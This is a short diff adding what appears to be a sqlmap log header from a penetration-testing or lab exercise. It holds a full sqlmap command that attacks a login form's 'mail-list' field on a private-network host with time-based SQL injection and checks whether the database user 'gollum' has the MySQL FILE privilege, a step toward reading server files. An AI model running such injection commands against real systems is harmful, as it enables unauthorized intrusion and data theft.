@@ -1,0 +1,5 @@
+http://192.168.145.48/index.php (POST)  # /usr/bin/sqlmap -u http://192.168.145.48/index.php --data=mail-list=test@test.com --dbms=mysql --technique=T --batch --risk=3 --threads=4 --timeout=30 --delay=0.3 "--sql-query=SELECT privilege_type FROM 
+  information_schema.user_privileges WHERE grantee LIKE 
+  '%gollum%' AND privilege_type='FILE'" --output-dir=./sqlmap_file_check -v 2
+
+mail-list=test@test.com
